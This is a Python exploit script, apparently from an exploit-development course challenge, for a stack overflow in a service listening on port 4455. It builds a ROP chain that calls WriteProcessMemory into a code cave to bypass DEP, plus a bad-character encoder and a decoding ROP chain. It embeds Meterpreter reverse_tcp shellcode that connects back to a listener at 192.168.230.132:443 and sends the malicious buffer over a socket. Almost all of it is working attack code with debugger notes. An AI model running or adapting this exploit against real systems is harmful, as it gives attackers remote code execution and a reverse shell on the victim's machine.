#!/usr/bin/python
import socket
import sys
from struct import pack


# Get two's complement of a negative value
def neg_repr(val):
    return (val + (1 << 32)) % (1 << 32)

#  I add 0x02 to each badchar (not 0x01 because 0x80 would become another badchar), and decoding ropchain will substract 0x02
badchars = [0x00, 0x0A, 0x11, 0x20, 0x28, 0x80, 0x81, 0x86]
replacechars = [0x00+0x02, 0x0A+0x02, 0x11+0x02, 0x20+0x02, 0x28+0x02, 0x80+0x02, 0x81+0x02, 0x86+0x02,]

# Useful techniques
# Add a small and positive value : POP EAX; POP ECX; ADD EAX, ECX with technique covered in PDF, patching flAllocationType listing 507
# Substract a small amount : POP ECX with two's complement, then ADD EAX, ECX
# Saving values : play with XCHG EAX, ESI and MOV ECX, ESI to save temporarily a value while you need to work with EAX and ECX


# Takes an integer in parameter, checks if once packed, it has badchars. Pauses script if badchar found
def check_badchar(dword: int) -> int:
    packed = pack('<L',dword)
    print(packed)
    for b in badchars:
        if b in packed:
            input(f"Badchar found in {hex(dword)}")
    return dword

# Get indexes of badchars (from PDF)
def mapBadChars(sh):
	i = 0
	badIndex = []
	while i < len(sh):
		for c in badchars:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	return badIndex

# Encode the shellcode (from PDF)
def encodeShellcode(sh):
	encodedShell = sh
	for i in range(len(badchars)):
		encodedShell = encodedShell.replace(pack("B", badchars[i]), pack("B", replacechars[i]))
	return encodedShell


def decode_stub(encoded_shellcode: bytearray, badIndex: list[int], len_main_ropchain: int):
    # Keep port 443 because it makes 01BB and doesn't need encoding
    # IP starting with 192.168.X.X is \xc0\xa8\xXX\xXX and should be only once in the shellcode
    decoding_rop = b''


    ### Realign ECX with end of shellcode-0x59
    # EAX is currently aligned with container lpBuffer
    # address(lpBuffer) + 2*4 (nSize+lpNumberOfBytesWritten) + len_main_ropchain + len(new_ropchain) + 0x59 (offset ECX write primitive) must point toward last badchar address to change
    # last badchar address = address(lpBuffer) + 2*4 (nSize+lpNumberOfBytesWritten) + len_main_ropchain + len(new_ropchain) + index_last_badchar
    decoding_rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    decoding_rop+=pack('<L',0xABCDDCBA) # JUNK EBP


    # Prepare ECX+0x59 to point toward the end of shellcode (on the 1st filling 43)
    # ? 0x82828282+0x7D7D7D7E (avoid 80 badchar) TODO ADAPT AND REALIGN ECX
    decoding_rop+=pack('<L',0x63101eb3) # pop eax ; pop ecx ; dec eax ; ret  ;
    decoding_rop+=pack('<L',0x82828483) # EAX - adapt EAX & ECX initial value if ECX creates a badchar
    ecx_value = 0x7D7D7A7D + len_main_ropchain + 361 - 0x59 + len(decoding_rop) + len(encoded_shellcode) + 5*4*len(badIndex) # 4*20 is size of decoding ropchain TODO ADAPT IF CHANGING SHELLCODE
    print(f'Going to POP ECX {hex(ecx_value)}, check for badchars in it')
    decoding_rop+=pack('<L',check_badchar(ecx_value)) # 
    decoding_rop+=pack('<L',0x63101ec2) # add eax, ecx ; ret  ;

    
    # Restore ECX and add EAX to ECX
    decoding_rop+=pack('<L',0x63101ed0) # mov ecx, esi ; add ecx, eax ; ret  ;

    # ECX points now toward right after the end of encoded_shellcode
    # 0:004> db ecx-1
    # 00aefd45  90 43 43 43

    # Store -0x02 into BL so we can ADD [ECX+0x59], BL
    decoding_rop+=pack('<L',0x63102792) # pop ebx ; ret  ;
    decoding_rop+=pack('<L',0xFFFFFFFE) # BL = -0x02

    print(badIndex)
    # Do in reverse order because there is no "SUB ECX, XX" instruction, so only ADD negative to avoid badchars
    for i in range(len(badIndex)-1, -1, -1):
        print(i)
        if i == len(badIndex)-1:
            # We could initially align toward 1st encoded value, but more complex
            offset =  badIndex[i] - len(encoded_shellcode)
            print(f'Initial offset is {offset} between {len(encoded_shellcode)} - {badIndex[i]}')
        else:
            offset = badIndex[i] - badIndex[i+1]
            print(f'New offset is {offset} between {badIndex[i+1]} - {badIndex[i]}')

        # Shift and re-align ECX (save ECX in EAX, POP ECX, ADD ECX, EAX)
        decoding_rop+=pack('<L',0x631023b6) # mov eax, ecx ; ret  ;
        ecx_value = neg_repr(offset)
        print(f'Going to POP ECX {hex(ecx_value)}, check for badchars in it')
        decoding_rop+=pack('<L',0x631021b8) # pop ecx ; ret  ;
        decoding_rop+=pack('<L',check_badchar(ecx_value)) # ECX
        decoding_rop+=pack('<L',0x63101ed2) # add ecx, eax ; ret  ;

        # Patch the value
        decoding_rop+=pack('<L',0x631021b6) # add byte [ecx+0x59], bl ; ret  ;


    #### Now it's time to restore ESP

    # Idea to restore ESP is the following:
    # Put address of container to POP EBP into ECX
    # Put address just above the container of WriteProcessMemroy into EAX
    # Write EAX into ECX's pointer
    # POP EBP now patched value
    # RET

    # Container to patch is ESI+2EC (must be stored into ECX)
    # 0:002> dd esi+0x2ec
    # 00b4fbf0  aaaaaaaa 63101ee3 90909090 90909090

    # EAX must contain ESI-0x10
    # 0:002> dd esi-10
    # 00b4f904  74de2890 63100bfc ffffffff 63100bfc


    # Don't use directly ECX (dependant of last badchar position), by putting EAX to 0 (for side-effect of next instruction), and saving ESI into ECX
    decoding_rop+=pack('<L',0x631024f4) # xor eax, eax ; ret  ;
    decoding_rop+=pack('<L',0x63101ed0) # mov ecx, esi ; add ecx, eax ; ret  ;

    # Save ECX into EAX
    decoding_rop+=pack('<L',0x631023b6) # mov eax, ecx ; ret  ;

    # Realign EAX with what to put into EBP/ESP
    decoding_rop+=pack('<L',0x631021b8) # pop ecx ; ret  ;
    decoding_rop+=pack('<L',0xfffffff0) # ECX = -0x10
    decoding_rop+=pack('<L',0x63101ec2) # add eax, ecx ; ret  ;

    # Save EAX into ESI (that will be restored into EAX later, after configuring ECX)
    decoding_rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    decoding_rop+=pack('<L',0xABCDDCBA) # JUNK EBP

    # Realign ECX with container to patch (ESI+0x2EC) Don't forget DEC EAX
    # TODO ADAPT
    decoding_rop+=pack('<L',0x63101eb3) # pop eax ; pop ecx ; dec eax ; ret  ;
    decoding_rop+=pack('<L',0x83838383) # EAX - adapt EAX & ECX initial value if ECX creates a badchar
    decoding_rop+=pack('<L',0x7c7c7f6a) # 
    decoding_rop+=pack('<L',0x63101ec2) # add eax, ecx ; ret  ;
    # Restore ECX and add EAX to ECX
    decoding_rop+=pack('<L',0x63101ed0) # mov ecx, esi ; add ecx, eax ; ret  ;


    # Put back ESI into EAX
    decoding_rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    decoding_rop+=pack('<L',0xABCDDCBA) # JUNK EBP


    decoding_rop+=pack('<L',0x631023ee) # xchg dword [ecx], eax ; pop ebp ; ret  ;
    decoding_rop+=pack('<L',0xABCDDCBA) # JUNK container EBP that is patched on runtime
    decoding_rop+=pack('<L',0x63101ee3) # mov esp, ebp ; ret  ;

    # 0:004> dd esp
    # 00aef904  74de2890 63100bfc ffffffff 63100bfc
    # 00aef914  00aefc00 00000400 63105630 63101eb1
    # 00aef924  63101eb3 aaaaaaa0 63101efa 63101efa

    # We are ready to "RET" into WriteProcessMemory!


    print(f'Length decoding ropchain : {len(decoding_rop)}')
    return decoding_rop


# The payload needs to be small to fit the small buffer size, hence the --smallest
# Can also use shellcode from course, use https://github.com/epi052/osed-scripts/blob/main/shellcoder.py
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.132 LPORT=443 -f python -v shellcode -e generic/none --smallest
# 0n296 bytes here
# Makes a Length decoding ropchain : 528
shellcode =  b""
shellcode+=b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
shellcode+=b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31"
shellcode+=b"\xff\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xc0\xac"
shellcode+=b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
shellcode+=b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
shellcode+=b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
shellcode+=b"\x8b\x58\x20\x8b\x48\x18\x50\x01\xd3\x85\xc9"
shellcode+=b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode+=b"\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4"
shellcode+=b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
shellcode+=b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
shellcode+=b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shellcode+=b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shellcode+=b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
shellcode+=b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
shellcode+=b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
shellcode+=b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
shellcode+=b"\x0a\x68\xc0\xa8\xe6\x85\x68\x02\x00\x01\xbb"
shellcode+=b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shellcode+=b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
shellcode+=b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shellcode+=b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff"
shellcode+=b"\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8"
shellcode+=b"\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00"
shellcode+=b"\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5"
shellcode+=b"\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8"
shellcode+=b"\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3"

# Pad the shellcode before and after, to prevent too much changes if adding/removing a gadget
shellcode = b'\x90'*16 + shellcode + b'\x90'*(350-len(shellcode))

# Extract indexes of badchars
badIndex = mapBadChars(shellcode)
# Replace badchars by encoded values
encoded  = encodeShellcode(shellcode)


try:
    server = sys.argv[1]
    port = 4455
    size = 1500

    # Found with msf-pattern_create
    offset_eip = 216

    # EIP : 00b3f920
    # Last 43 : 00b3fe76
    # 0:004> ? 00b3fe76-00b3f920  
    # Evaluate expression: 1366 = 00000556


    # inputBuffer = b"A"*size
    # inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu'
    bads = [0x00, 0x0A, 0x11, 0x20, 0x28, 0x80, 0x81, 0x86]
    badchars_array = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x01\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x01\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x01"
        b"\x21\x22\x23\x24\x25\x26\x27\x01\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x01"
        b"\x01\x82\x83\x84\x85\x01\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

###### CODE CAVE? ######
    # 0:001> lm
    # start    end        module name
    # 63100000 63107000   wumed_challenge_01   (deferred)             
    # 68750000 68765000   VCRUNTIME140   (deferred)             
    
    # 0:001> dd wumed_challenge_01 + 3C L1
    # 6310003c  000000f8
    # 0:001> dd wumed_challenge_01 + f8 + 2C L1
    # 63100124  00001000
    # 0:001> ? wumed_challenge_01 + 1000
    # Evaluate expression: 1661997056 = 63101000
    # 0:001> !address 63101000

    # Usage:                  Image
    # Base Address:           63101000
    # End Address:            63103000
    # Region Size:            00002000 (   8.000 kB)
    # State:                  00001000          MEM_COMMIT
    # Protect:                00000020          PAGE_EXECUTE_READ
    # Type:                   01000000          MEM_IMAGE
    # ...

    # Size of 0x350 is enough and fits our shellcode, and does not contain badchar
    # 0:001> dd 63103000 - 350
    # 63102cb0  00000000 00000000 00000000 00000000
    # 63102cc0  00000000 00000000 00000000 00000000

    # 63102cb0 is a good code cave, no badchar

###### TEMPLATE WriteProcessMemory ######
    wpm =pack("<L",0x45454545)     # WriteProcessMemory Address  NEEDS PATCHING
    wpm+=pack("<L",0x63102cb0)     # Shellcode Return Address (code cave)
    wpm+=pack("<L",0xFFFFFFFF)     # pseudo Process handle
    wpm+=pack("<L",0x63102cb0)     # Destination address (code cave)
    wpm+=pack("<L",0x49494949)     # lpBuffer (stack origin address) NEEDS PATCHING
    wpm+=pack("<L",0x51515151)     # nSize NEEDS PATCHING
    wpm+=pack("<L",0x63105630)     # lpNumberOfBytesWritten (.data last available cell)


    # rop variable will contain the main ROPchain
    rop = b''

    # Save ESP and know shellcode's position
    rop+=pack('<L',0x63101eb1) # mov ebp, esp ; pop eax ; pop ecx ; dec eax ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EAX
    rop+=pack('<L',0xABCDDCBA) # JUNK ECX
    
    # Tricky part, but to save EBP into a register, there is a side-effect of MOV ESP, EBP, so I put EBP after to resume proper execution
    rop+=pack('<L',0x63101efa) # add ebp, 0x08 ; ret  ;
    rop+=pack('<L',0x63101efa) # add ebp, 0x08 ; ret  ;
    rop+=pack('<L',0x63101efa) # add ebp, 0x08 ; ret  ;
    rop+=pack('<L',0x63101edc) # lea eax, dword [ebp-0x04] ; add eax, 0x08 ; push ecx ; mov esp, ebp ; ret  ;

    # EAX is just +0x3C after our 1st container
    # 0:002> dd eax-3C
    # 00a2f904  45454545 45402e40 ffffffff 45402e40
    # 00a2f914  49494949 51515151 52525252 63101eb1

    # Align ECX with 1st container
    rop+=pack('<L',0x631021b8) # pop ecx ; ret  ; ### Can be optimized by exploiting the POP ECX of the 1st instruction, but optional
    rop+=pack('<L',0xffffffc4) # ECX = -0x3C

    # ECX+=EAX
    rop+=pack('<L',0x63101ed2) # add ecx, eax ; ret  ;
    # ECX points toward 1st container

###### WriteProcessMemory patching ######
    # Where is located WriteProcessMemoryStub in the IAT?
    # 0:002> u Kernel32!WriteProcessMemoryStub
    # KERNEL32!WriteProcessMemoryStub:
    # 74eb2890 8bff            mov     edi,edi

    # 0:002> lm
    # start    end        module name
    # 63100000 63107000   wumed_challenge_01 C (no symbols)

    # 0:002> s -d 63100000 63107000 74eb2890
    # 63103020  74eb2890 74e969d0 74e95ec0 74e98670  .(.t.i.t.^.tp..t

    # EAX = FFFFFFFF for saving using AND, EBP = 63103020-0x08
    rop+=pack('<L',0x631024f4) # xor eax, eax ; ret  ;
    rop+=pack('<L',0x63102459) # dec eax ; pop ebp ; ret  ;
    rop+=pack('<L',0x63103018) # EBP = 63103020-0x08 = align with IAT

    rop+=pack('<L',0x63102442) # and eax, dword [ebp+0x08] ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP

    # EAX contains the VirtualAddress of WriteProcessMemoryStub
    # 0:002> u eax
    # KERNEL32!WriteProcessMemoryStub:
    # 74eb2890 8bff            mov     edi,edi

    # Patch the container
    rop+=pack('<L',0x631023ee) # xchg dword [ecx], eax ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP
    # 0:002> dd ecx
    # 009cf904  74eb2890 45402e40 ffffffff 45402e40

###### WriteProcessMemory patched ######


###### lpBuffer patching ######
    # Since there is no easy way to POP EAX without destroying ECX, we need to save ECX into ESI before any manipulation (and multiple times across the ROP chain)

    # ECX currently aligned with 1st container, let's save it into EAX then ESI, for manipulations between EAX & ECX
    rop+=pack('<L',0x631023b6) # mov eax, ecx ; ret  ;
    rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP

    # Realign ECX (ESI+0x10)
    rop+=pack('<L',0x63101eb3) # pop eax ; pop ecx ; dec eax ; ret  ;
    rop+=pack('<L',0xfffffff4) # EAX = -0x0C
    rop+=pack('<L',0xABCDDCBA) # JUNK ECX
    rop+=pack('<L',0x63102457) # neg eax ; dec eax ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP

    # Restore ECX and Add +0x0C to realign ECX
    rop+=pack('<L',0x63101ed0) # mov ecx, esi ; add ecx, eax ; ret  ;

    # 0:004> dd ecx
    # 00c5f910  63102cb0 49494949 51515151 63105630


    # Save again ECX into ESI for backup
    rop+=pack('<L',0x631023b6) # mov eax, ecx ; ret  ;
    rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP

    # ESI points toward Container "49494949"

    # Let's make ECX point toward our shellcode, by adding an arbitrary value
    # EAX + 0x04 + ECX - 0x01 >>> EAX+ECX = 0x2f0
    # ? 0x82828382+0x7D7D7E91 = 000002f0 + 1 (avoid 80/81 badchar)
    rop+=pack('<L',0x63101eb3) # pop eax ; pop ecx ; dec eax ; ret  ;
    rop+=pack('<L',0x82828382) # EAX + ECX = 0x2f0, TODO adapt EAX if ECX contains badchars
    ecx_value = 0x7d7d7f6f + 0 - 2*4 # TODO ADAPT IF ROPCHAIN GROWING
    print(f'Going to POP ECX {hex(ecx_value)} for lpBuffer, check for badchars in it')
    rop+=pack('<L',check_badchar(ecx_value))
    rop+=pack('<L',0x63101ec2) # add eax, ecx ; ret  ;
    # EAX = 0x2F0

    # Restore ECX from ESI, and add EAX to ECX
    rop+=pack('<L',0x63101ed0) # mov ecx, esi ; add ecx, eax ; ret  ;

    # Restore EAX by NEG EAX then ADD EAX, ECX (so make it ECX-0x2F0, pointing to original place)
    rop+=pack('<L',0x63102457) # neg eax ; dec eax ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP
    rop+=pack('<L',0x631024f9) # inc eax ; ret  ;
    rop+=pack('<L',0x63101ec2) # add eax, ecx ; ret  ;
    
    # 0:004> dd eax
    # 00aef910  63102cb0 49494949 51515151 52525252
    # 0:004> dd ecx
    # 00aefa22  43434343 43434343 43434343 43434343


    # Write beginning shellcode address into EAX+0x04
    rop+=pack('<L',0x63102553) # mov dword [eax+0x04], ecx ; ret  ;

    # 0:004> dd eax
    # 00aef910  63102cb0 00aefa22 51515151 52525252

###### lpBuffer patched ######


###### nSize patching ######
    # Idea:
    # Store nSize into ECX by doing POP EAX, POP ECX, ADD ECX, EAX
    # Restore EAX using xchg eax, esi ;
    # INC EAX *4
    # mov dword [eax+0x04], ecx ; ret  ;
    # Save ESI using xchg eax, esi ;

    # ECX = 0x82828a83 + 0x7D7D797E = 0n366 + 1 TODO ADAPT nSize 81 WON'T WORK
    rop+=pack('<L',0x63101eb3) # pop eax ; pop ecx ; dec eax ; ret  ;
    rop+=pack('<L',0x82828a83) # EAX + ECX = 0x16e = 0n366 (len encoded shellcode padded)
    rop+=pack('<L',0x7d7d76ec) #
    rop+=pack('<L',0x63101ed2) # add ecx, eax ; ret  ;

    # Realign EAX
    rop+=pack('<L',0x63101ecd) # xchg eax, esi ; pop ebp ; ret  ;
    rop+=pack('<L',0xABCDDCBA) # JUNK EBP
    rop+=pack('<L',0x631024f9) # inc eax ; ret  ;
    rop+=pack('<L',0x631024f9) # inc eax ; ret  ;
    rop+=pack('<L',0x631024f9) # inc eax ; ret  ;
    rop+=pack('<L',0x631024f9) # inc eax ; ret  ;

    # Write nSIZE
    rop+=pack('<L',0x63102553) # mov dword [eax+0x04], ecx ; ret  ;
###### nSize patched ######

# All arguments patched


###### Append decoding ropchain ######
    decoding_rop = decode_stub(encoded, badIndex, len(rop))

    inputBuffer =b''
    inputBuffer+=b'A'*(offset_eip-len(wpm))      # Prepend with 0x41 before the WPM template
    inputBuffer+=wpm                             # Add the template before the EIP override
    inputBuffer+=rop                            # First gadget is aligned with EIP override
    inputBuffer+=decoding_rop               # Add the decoding ROPChain after the main ropchain
    inputBuffer+=encoded                         # Add the encoded shellcode after decoding ROPchain
    print(f'Total len inputBuffer {len(inputBuffer)}, max buffer size is 1582') # Check that full buffer will fit in the maximum size
    inputBuffer+=b'C'*(size-len(inputBuffer))    # Fill the buffer with C's (optional)


    command = b"COMMAND COPYTEXT "
    command+= inputBuffer
    command+= b"\r\n"

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(command)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")
